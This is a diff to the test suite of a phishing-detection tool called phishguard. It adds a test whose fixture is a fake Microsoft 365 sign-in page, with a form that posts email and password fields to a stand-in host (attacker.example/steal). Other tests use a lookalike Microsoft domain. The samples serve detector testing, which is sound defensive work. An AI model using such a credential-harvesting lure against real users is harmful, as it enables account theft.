@@ -78,8 +78,8 @@ def test_parse_adds_scheme():
 def test_cli_json_exit(tmp_path):
     from phishguard.cli import main
 
-    assert main(["https://www.microsoft.com"]) == 0
-    assert main(["https://login.microsoft.com.phish.xyz/"]) == 1
+    assert main(["--no-probe", "https://www.microsoft.com"]) == 0
+    assert main(["--no-probe", "https://login.microsoft.com.phish.xyz/"]) == 1
 
 
 def test_sharepoint_lure_is_phishing():
@@ -120,3 +120,22 @@ def test_href_mismatch_html():
     r = analyze(html)
     assert r.verdict == "phishing"
     assert any(f.code == "href_mismatch" for f in r.findings)
+
+
+def test_fake_html_login_kit_is_phishing(monkeypatch):
+    fake = """
+    <html><head><title>Microsoft 365 Sign in</title></head>
+    <body>
+      <form action="https://attacker.example/steal">
+        <input type="email" name="loginfmt">
+        <input type="password" name="passwd">
+      </form>
+    </body></html>
+    """
+    monkeypatch.setattr("phishguard.engine.fetch_html", lambda url: (fake, None, 200))
+    r = analyze("https://random-unlisted-site.example/owa/", probe=True)
+    assert r.verdict == "phishing"
+    assert r.score >= 85
+    codes = {f.code for f in r.findings}
+    assert "password_form" in codes
+    assert "brand_in_page" in codes
